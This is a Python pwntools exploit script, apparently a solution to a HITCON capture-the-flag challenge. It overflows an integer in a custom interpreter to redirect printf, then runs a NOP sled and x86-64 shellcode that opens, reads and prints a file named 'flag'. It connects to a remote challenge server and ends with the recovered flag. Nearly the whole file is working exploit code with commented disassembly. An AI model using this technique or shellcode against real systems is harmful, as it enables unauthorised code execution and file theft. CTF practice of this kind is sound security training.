from pwn import *

stack_offset = "4294967273"
data_offset = "2107626"

#shellcode assembled below
shellcode = "\x48\x31\xF6\x48\x8d\x3d\x41\x00\x00\x00\x48\x31\xD2\x48\x31\xC0\x48\x31\xC9\x48\x31\xF6\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xc7\x4c\x89\xEE\x48\xC7\xC2\x7F\x00\x00\x00\x48\x31\xC0\x0F\x05\x48\x31\xFF\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xC2\x48\x31\xC0\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"

def swap():
   return "\\"

def add():
   return "+"

def rot():
   return "@"

def writed():
   return "."

p = ''
p += stack_offset  #overflow address to make negative
p += swap()        #put overflowed value into custom stack pointer      
p += data_offset   #add data offset to print f
p += rot()         #switch printf's upper and lower 8 bytes
p += swap()        #switch printf and data_offset
p += add()         #add data_offset to printf
p += swap()        #move everything back to original locations
p += writed()       #jump to value we wrote on printf
p += "\x90"*260    #
p += shellcode     #see below open read and writes file
p += "\x90"        #single nop
p += "flag "       #file name to open

sh = remote('35.200.23.198', 31733)
sh.recvline()
sh.sendline(p)
sh.interactive()
#shellcode
#0:  48 31 f6                xor    rsi,rsi
#3:  48 8d 3d 41 00 00 00    lea    rdi,[rip+0x41]        # 0x4b
#a:  48 31 d2                xor    rdx,rdx
#d:  48 31 c0                xor    rax,rax
#10: 48 31 c9                xor    rcx,rcx
#13: 48 31 f6                xor    rsi,rsi
#16: 48 c7 c0 02 00 00 00    mov    rax,0x2
#1d: 0f 05                   syscall
#1f: 48 89 c7                mov    rdi,rax
#22: 4c 89 ee                mov    rsi,r13
#25: 48 c7 c2 7f 00 00 00    mov    rdx,0x7f
#2c: 48 31 c0                xor    rax,rax
#2f: 0f 05                   syscall
#31: 48 31 ff                xor    rdi,rdi
#34: 48 c7 c7 01 00 00 00    mov    rdi,0x1
#3b: 48 89 c2                mov    rdx,rax
#3e: 48 31 c0                xor    rax,rax
#41: 48 c7 c0 01 00 00 00    mov    rax,0x1
#48: 0f 05                   syscall 

#hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
 
 
